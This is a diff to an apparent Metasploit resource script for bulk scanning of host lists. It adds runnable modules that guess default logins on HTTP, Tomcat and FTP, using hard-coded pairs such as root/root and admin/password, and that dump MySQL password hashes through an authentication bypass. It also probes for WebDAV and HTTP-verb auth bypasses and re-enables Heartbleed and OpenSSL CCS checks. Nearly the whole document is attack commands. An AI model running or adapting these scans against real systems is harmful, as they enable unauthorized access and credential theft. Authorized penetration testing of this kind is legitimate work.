@@ -15,6 +15,12 @@ set RHOSTS file:smb-hosts.txt
 
 run
 spool off
+spool logs/named_pipes.log
+use auxiliary/scanner/smb/pipe_auditor
+set RHOSTS file:smb-hosts.txt
+
+run
+spool off
 
 
 spool logs/smb_enumshares.log
@@ -23,7 +29,6 @@ set RHOSTS file:smb-hosts.txt
 
 run
 spool off
-
 
 spool logs/mssql_login.log
 use auxiliary/scanner/mssql/mssql_login
@@ -42,6 +47,11 @@ set RHOSTS file:mssql-hosts.txt
 run
 spool off
 
+spool logs/mysql_authbypass_hashdump.log
+use auxiliary/scanner/mysql/mysql_authbypass_hashdump
+set RHOSTS file:3306-tcp-hosts.txt
+run
+spool off
 
 spool logs/webdav_scanner.log
 use auxiliary/scanner/http/webdav_scanner
@@ -49,6 +59,63 @@ set RHOSTS file:http-hosts.txt
 
 run
 spool off
+
+spool logs/dir_webdav_unicode_bypass.log
+use auxiliary/scanner/http/dir_webdav_unicode_bypass
+set RHOSTS file:http-hosts.txt
+
+spool off
+
+spool logs/vulnerable_directories.log
+use auxiliary/scanner/http/dir_scanner
+set RHOSTS file:web-urls.txt
+run
+spool off
+
+spool logs/vulnerable_webserver_files.log
+use auxiliary/scanner/http/files_dir
+set RHOSTS file:web-urls.txt
+run
+spool off
+
+spool logs/http_dic_attack.log
+use auxiliary/scanner/http/http_login
+set RHOSTS file:web-urls.txt
+run
+spool off
+
+##Edited Wordlist For HTTP Dictionary Attack##
+#admin admin
+#admin password
+#administrator password
+#guest guest
+#root root
+#root password
+#connect connect
+#sitecom sitecom
+#admin 1234
+#cisco cisco
+#cisco sanfran
+#private private
+#wampp xampp
+#newuser wampp
+#xampp-dav-unsecure ppmax2011 
+#admin turnkey
+#vagrant vagrant
+######################################
+
+spool logs/default_tomcat_mgr_login.log
+use auxiliary/scanner/http/tomcat_mgr_login
+run
+spool off
+
+spool logs/verb_auth_bypass.log
+use auxiliary/scanner/http/verb_auth_bypass
+set RHOSTS file:http-hosts.txt
+run
+spool off
+
+
 
 
 spool logs/vnc_login.log
@@ -138,21 +205,43 @@ set RHOSTS file:ftp-hosts.txt
 run
 spool off
 
+spool logs/common_ftp_login.log
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS file:ftp-hosts.txt
 
-#spool logs/openssl_heartbleed.log
-#use auxiliary/scanner/ssl/openssl_heartbleed
-#set RHOSTS file:https-hosts.txt
+set USERNAME root
+set PASSWORD root
+set threads 10
+run
 
-#run
-#spool off
+set USERNAME admin
+set PASSWORD admin
+run
+
+set USERNAME admin
+set PASSWORD password
+run
+
+set USERNAME ftp
+set PASSWORD ftp
+run
+
+spool off
+
+spool logs/openssl_heartbleed.log
+use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOSTS file:https-hosts.txt
+
+run
+spool off
 
 
-#spool logs/openssl_ccs.log
-#use auxiliary/scanner/ssl/openssl_ccs
-#set RHOSTS file:https-hosts.txt
+spool logs/openssl_ccs.log
+use auxiliary/scanner/ssl/openssl_ccs
+set RHOSTS file:https-hosts.txt
 
-#run
-#spool off
+run
+spool off
 
 
 spool logs/postgres_login.log
@@ -162,6 +251,11 @@ set RHOSTS file:postgresql-hosts.txt
 run
 spool off
 
+spool logs/postgres_version.log
+use auxiliary/scanner/postgres/postgres_version
+set RHOSTS file:postgresql-hosts.txt
+run
+spool off
 
 spool logs/snmp_enum.log
 use auxiliary/scanner/snmp/snmp_enum
@@ -208,7 +302,7 @@ run
 
 set USERNAME cisco
 set USERNAME cisco
-
+run
 spool off
 
 exit
